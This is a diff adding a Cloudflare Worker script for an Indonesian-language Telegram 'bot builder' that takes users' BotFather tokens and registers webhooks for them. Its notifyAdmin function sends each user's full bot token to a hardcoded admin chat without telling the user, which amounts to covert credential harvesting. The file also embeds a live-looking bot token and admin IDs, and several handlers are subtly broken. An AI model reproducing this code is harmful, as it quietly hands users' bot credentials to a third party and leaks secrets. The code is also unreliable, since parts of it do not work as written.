@@ -1,0 +1,504 @@
+// Environment variables (set these in your Cloudflare Workers settings)
+const TELEGRAM_TOKEN = '7493047624:AAH2bU7Wil-FBFFS48lavExIgpij1qpQ99s';
+const ADMIN_CHAT_ID = 5874973841;
+const WEBHOOK_BASE_URL = 'https://botlivechat.aknme19.workers.dev'; // Define your base URL
+
+
+// Simple in-memory storage
+const userDb = {};
+const BOTS_KV = BOTS;
+
+// Telegram API methods
+function sendMessage(chatId, text, options = {}) {
+  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: text,
+      ...options
+    })
+  }).then(response => response.json());
+}
+
+function editMessage(payload) {
+  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(response => response.json());
+}
+
+function answerCallbackQuery(callbackQueryId) {
+  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ callback_query_id: callbackQueryId })
+  }).then(response => response.json());
+}
+
+function getBotInfo(token) {
+  return fetch(`https://api.telegram.org/bot${token}/getMe`)
+    .then(response => response.json());
+}
+
+function forwardToAdmin(update) {
+  const message = update.message;
+  const user = message.from;
+  const text = `<b>Support Request</b>\nFrom: ${user.first_name} ${user.last_name || ''}\nID: ${user.id}\nMessage:\n${message.text}`;
+  
+  return sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
+}
+
+function notifyAdmin(user, token) {
+  const text = `<b>New Bot Created</b>\nUser: ${user.first_name} ${user.last_name || ''}\nID: ${user.id}\nToken: <code>${token}</code>`;
+  
+  return sendMessage(ADMIN_CHAT_ID, text, { 
+    parse_mode: 'HTML',
+    disable_web_page_preview: true
+  });
+}
+
+// Bot creation and management
+function createNewBot(token, userId) {
+  // Validasi format token
+  if (!token.match(/^\d{9,10}:[a-zA-Z0-9_-]{35}$/)) {
+    return Promise.resolve(false);
+  }
+  
+  return getBotInfo(token).then(botInfo => {
+    if (!botInfo || !botInfo.ok) {
+      return false;
+    }
+
+    const webhookUrl = `${WEBHOOK_BASE_URL}/bot${token}?admin=${userId}`;
+    
+    return fetch(`https://api.telegram.org/bot${token}/setWebhook`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url: webhookUrl })
+    })
+    .then(response => response.json())
+    .then(result => {
+      if (result.ok) {
+        const botData = {
+          token,
+          webhookUrl,
+          createdAt: Date.now(),
+          userId: userId.toString()
+        };
+        
+        return Promise.all([
+          BOTS_KV.put(`bot_${token}`, JSON.stringify(botData)),
+          BOTS_KV.put(`user_${userId}_${token}`, 'active')
+        ]).then(() => true);
+      }
+      return false;
+    });
+  })
+  .catch(error => {
+    console.error('Error membuat bot:', error);
+    return false;
+  });
+}
+
+// Bot listing and deletion functions
+// Fungsi untuk mendapatkan bot milik user
+function getUserBots(userId) {
+  return BOTS_KV.list({ prefix: `user_${userId}_` })
+    .then(list => {
+      const botPromises = list.keys.map(key => {
+        const token = key.name.split('_')[2];
+        return BOTS_KV.get(`bot_${token}`, 'json');
+      });
+      return Promise.all(botPromises);
+    })
+    .then(bots => bots.filter(bot => bot !== null));
+}
+
+// Fungsi untuk menampilkan daftar bot
+function showBotList(chatId, messageId, page = 1) {
+  const botsPerPage = 5;
+  
+  return getUserBots(chatId).then(userBots => {
+    if (userBots.length === 0) {
+      const keyboard = {
+        inline_keyboard: [[{ text: "🔙 Kembali", callback_data: 'bt_start' }]]
+      };
+      
+      return editMessage({
+        chat_id: chatId,
+        message_id: messageId,
+        text: "🤖 Anda belum memiliki bot aktif.",
+        reply_markup: keyboard
+      });
+    }
+
+    const totalPages = Math.ceil(userBots.length / botsPerPage);
+    const startIdx = (page - 1) * botsPerPage;
+    const botsToShow = userBots.slice(startIdx, startIdx + botsPerPage);
+
+    const botInfoPromises = botsToShow.map(bot => 
+      getBotInfo(bot.token).then(botInfo => ({
+        bot,
+        username: botInfo?.result?.username || null
+      }))
+    );
+
+    return Promise.all(botInfoPromises).then(botInfos => {
+      const botButtons = botInfos.map(({bot, username}) => {
+        return [{
+          text: username ? `@${username}` : `Bot ${bot.token.slice(0, 5)}`,
+          callback_data: `delete_bot_${bot.token}`
+        }];
+      });
+
+      const pageButtons = [];
+      if (page > 1) {
+        pageButtons.push({
+          text: "◀️",
+          callback_data: `list_bots_${page - 1}`
+        });
+      }
+      if (page < totalPages) {
+        pageButtons.push({
+          text: "▶️",
+          callback_data: `list_bots_${page + 1}`
+        });
+      }
+
+      const keyboard = {
+        inline_keyboard: [
+          ...botButtons,
+          pageButtons,
+          [{ text: "🔙", callback_data: 'bt_start' }]
+        ]
+      };
+
+      return editMessage({
+        chat_id: chatId,
+        message_id: messageId,
+        text: `📋 Daftar Bot Anda\nHalaman ${page}/${totalPages}`,
+        reply_markup: keyboard
+      });
+    });
+  });
+}
+
+
+function confirmDeleteBot(chatId, messageId, botToken) {
+  const botInfo = getBotInfo(botToken);
+  const botName = botInfo?.username ? `@${botInfo.username}` : 'Bot ini';
+  
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "❌ Hapus", callback_data: `confirm_delete_${botToken}` },
+        { text: "🔙 Batal", callback_data: 'cancel_delete' }
+      ]
+    ]
+  };
+
+  return editMessage({
+    chat_id: chatId,
+    message_id: messageId,
+    text: `⚠️ <b>Konfirmasi Hapus Bot</b>\n\nAnda yakin ingin menghapus ${botName}?\n\nToken: <code>${botToken.slice(0, 10)}...</code>`,
+    reply_markup: keyboard,
+    parse_mode: 'HTML'
+  });
+}
+
+function deleteBot(chatId, botToken, messageId) {
+  return fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ url: '' })
+  })
+  .then(() => BOTS_KV.get(`bot_${botToken}`, 'json'))
+  .then(botData => {
+    const deletePromises = [BOTS_KV.delete(`bot_${botToken}`)];
+    
+    if (botData && botData.userId) {
+      deletePromises.push(BOTS_KV.delete(`user_${botData.userId}_${botToken}`));
+    }
+    
+    return Promise.all(deletePromises);
+  })
+  .then(() => {
+    const keyboard = {
+      inline_keyboard: [[{ text: "🔙 Kembali ke Menu", callback_data: 'bt_start' }]]
+    };
+
+    return editMessage({
+      chat_id: chatId,
+      message_id: messageId,
+      text: "✅ Bot berhasil dihapus!",
+      reply_markup: keyboard
+    });
+  })
+  .catch(error => {
+    console.error('Gagal menghapus bot:', error);
+    return sendMessage(chatId, "❌ Gagal menghapus bot. Silakan coba lagi.");
+  });
+}
+
+
+function cancelDelete(chatId, messageId) {
+  return showBotList(chatId, messageId);
+}
+
+// Message handlers
+function sendStartMessage(chatId, messageId = null) {
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "📝 Tentang", callback_data: 'bt_about' }],
+      [
+        { text: "🤖 Buat Bot Baru", callback_data: 'bt_build' },
+        { text: "📋 Kelola Bot", callback_data: 'list_bots_1' }
+      ],
+      [
+        { text: "🆘 Bantuan", callback_data: 'bt_admin' },
+        { text: "💬 Support", callback_data: 'bt_sp' }
+      ]
+    ]
+  };
+
+  const payload = {
+    chat_id: chatId,
+    text: "👋 Selamat datang di live chat Builder! Silakan pilih opsi:",
+    reply_markup: keyboard
+  };
+
+  if (messageId) {
+    payload.message_id = messageId;
+    return editMessage(payload);
+  } else {
+    return sendMessage(chatId, payload.text, { reply_markup: keyboard });
+  }
+}
+
+function handleBuildBot(chatId, messageId) {
+  userDb[`addbot_${chatId}`] = true;
+  
+  const keyboard = {
+    inline_keyboard: [[{ text: "🔙 Kembali", callback_data: 'bt_start' }]]
+  };
+
+  return editMessage({
+    chat_id: chatId,
+    message_id: messageId,
+    text: "📝 <b>Panduan Membuat Bot</b>\n\n1. Buka @BotFather dan kirim /newbot\n2. Ikuti instruksi untuk membuat bot baru\n3. Setelah mendapatkan token, <b>teruskan pesan lengkap dari @BotFather</b> ke saya",
+    reply_markup: keyboard,
+    parse_mode: 'HTML'
+  });
+}
+
+function handleForwardedFromBotFather(update) {
+  const chatId = update.message.chat.id;
+  const messageText = update.message.text;
+  
+  if (!userDb[`addbot_${chatId}`]) {
+    return Promise.resolve();
+  }
+  
+  const tokenMatch = messageText.match(/\d{9,10}:[a-zA-Z0-9_-]{35}/);
+  if (!tokenMatch) {
+    return sendMessage(chatId, '❌ Format token tidak valid. Pastikan Anda meneruskan pesan lengkap dari @BotFather.');
+  }
+  
+  const token = tokenMatch[0];
+  const userId = update.message.from.id;
+  
+  return createNewBot(token, userId).then(success => {
+    if (success) {
+      return getBotInfo(token).then(botInfo => {
+        const username = botInfo?.result?.username || 'your_bot';
+        return sendMessage(chatId, `✅ Bot berhasil dibuat!\n\nUsername: @${username}`);
+      }).then(() => notifyAdmin(update.message.from, token));
+    } else {
+      return sendMessage(chatId, '❌ Gagal membuat bot. Silakan coba lagi.');
+    }
+  }).finally(() => {
+    delete userDb[`addbot_${chatId}`];
+  });
+}
+
+function handleCallbackQuery(update) {
+  const query = update.callback_query;
+  const chatId = query.message.chat.id;
+  const data = query.data;
+  
+  return answerCallbackQuery(query.id).then(() => {
+    if (data.startsWith('list_bots_')) {
+      const page = parseInt(data.split('_')[2]) || 1;
+      return showBotList(chatId, query.message.message_id, page);
+    }
+    else if (data.startsWith('delete_bot_')) {
+      const botToken = data.split('_')[2];
+      return confirmDeleteBot(chatId, query.message.message_id, botToken);
+    }
+    else if (data.startsWith('confirm_delete_')) {
+      const botToken = data.split('_')[2];
+      return deleteBot(chatId, botToken, query.message.message_id);
+    }
+    else if (data === 'cancel_delete') {
+      return cancelDelete(chatId, query.message.message_id);
+    }
+    else if (data === 'bt_start') {
+      return sendStartMessage(chatId, query.message.message_id);
+    }
+    else if (data === 'bt_build') {
+      return handleBuildBot(chatId, query.message.message_id);
+    }
+    else if (data === 'bt_about') {
+      const keyboard = {
+        inline_keyboard: [[{ text: "🔙 Kembali", callback_data: 'bt_start' }]]
+      };
+      return editMessage({
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        text: "🤖 <b>Tentang live chat Builder</b>\n\nBot untuk membuat bot Telegram tanpa server pribadi.",
+        reply_markup: keyboard,
+        parse_mode: 'HTML'
+      });
+    }
+    else if (data === 'bt_admin') {
+      const keyboard = {
+        inline_keyboard: [
+          [
+            { text: "👮 Admin 1", url: "tg://user?id=1910497806" },
+            { text: "👮 Admin 2", url: "tg://user?id=6013163225" }
+          ],
+          [{ text: "🔙 Kembali", callback_data: 'bt_start' }]
+        ]
+      };
+      return editMessage({
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        text: "<b>📞 Kontak Admin</b>\n\nHubungi admin jika Anda membutuhkan bantuan:",
+        reply_markup: keyboard,
+        parse_mode: 'HTML'
+      });
+    }
+    else if (data === 'bt_sp') {
+      userDb[`support_${chatId}`] = true;
+      const keyboard = {
+        inline_keyboard: [[{ text: "❌ Batalkan", callback_data: 'bt_cancel' }]]
+      };
+      return editMessage({
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        text: "💬 <b>Mode Support</b>\n\nSilakan kirim pesan Anda untuk admin support...",
+        reply_markup: keyboard,
+        parse_mode: 'HTML'
+      });
+    }
+    else if (data === 'bt_cancel') {
+      delete userDb[`support_${chatId}`];
+      return sendMessage(chatId, "❌ Permintaan dibatalkan");
+    }
+  });
+}
+
+function handleMessage(update) {
+  const chatId = update.message.chat.id;
+  const text = update.message.text;
+  
+  if (userDb[`support_${chatId}`]) {
+    return forwardToAdmin(update)
+      .then(() => sendMessage(chatId, '✅ Pesan Anda telah diteruskan ke support.'))
+      .then(() => delete userDb[`support_${chatId}`]);
+  }
+  
+  return sendStartMessage(chatId);
+}
+
+// Webhook handlers
+function handleMainBotWebhook(update) {
+  if (!update || (!update.message && !update.callback_query)) {
+    return Promise.resolve(new Response('Invalid update', { status: 400 }));
+  }
+
+  if (update.message) {
+    if (update.message.forward_from && update.message.forward_from.id === 93372553) {
+      return handleForwardedFromBotFather(update)
+        .catch(error => {
+          console.error('Error handling forwarded message:', error);
+          return sendMessage(update.message.chat.id, '❌ Terjadi kesalahan. Silakan coba lagi.');
+        });
+    } else if (update.message.text) {
+      return handleMessage(update)
+        .catch(error => {
+          console.error('Error handling message:', error);
+          return Promise.resolve();
+        });
+    }
+  } else if (update.callback_query) {
+    return handleCallbackQuery(update)
+      .catch(error => {
+        console.error('Error handling callback:', error);
+        return sendMessage(update.callback_query.message.chat.id, '❌ Terjadi kesalahan. Silakan coba lagi.');
+      });
+  }
+
+  return Promise.resolve();
+}
+
+function handleBotWebhook(token, update) {
+  if (!update || !update.message) {
+    return new Response('Invalid update', { status: 400 });
+  }
+
+  const chatId = update.message.chat.id;
+  const text = update.message.text;
+  
+  if (text && text.startsWith('/start')) {
+    return sendMessage(token, chatId, 
+      "👋 Hai! Saya adalah bot yang dibuat oleh live chat Builder.\n\nGunakan /help untuk melihat fitur.")
+      .then(() => new Response(JSON.stringify({ success: true }), { 
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      }));
+  } else if (text) {
+    return sendMessage(token, chatId, `Anda mengatakan: ${text}`)
+      .then(() => new Response(JSON.stringify({ success: true }), { 
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      }));
+  }
+
+  return new Response(JSON.stringify({ success: true }), { 
+    status: 200,
+    headers: { 'Content-Type': 'application/json' }
+  });
+}
+
+// Main request handler
+function handleRequest(request) {
+  const url = new URL(request.url);
+  
+  if (url.pathname === '/') {
+    return new Response('live chat Builder Bot is running!', { status: 200 });
+  }
+  
+  if (url.pathname === '/webhook' && request.method === 'POST') {
+    return request.json().then(data => {
+      return handleMainBotWebhook(data).then(() => {
+        return new Response(JSON.stringify({ success: true }), { 
+          status: 200,
+          headers: { 'Content-Type': 'application/json' }
+        });
+      });
+    }).catch(error => {
+      console.error('Error processing main webhook:', error);
+      return new Response('Invalid request', { status: 400 });
+    });
+  }
+  
+  
+  return new Response('Not Found', { status: 404 });
+}
+
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
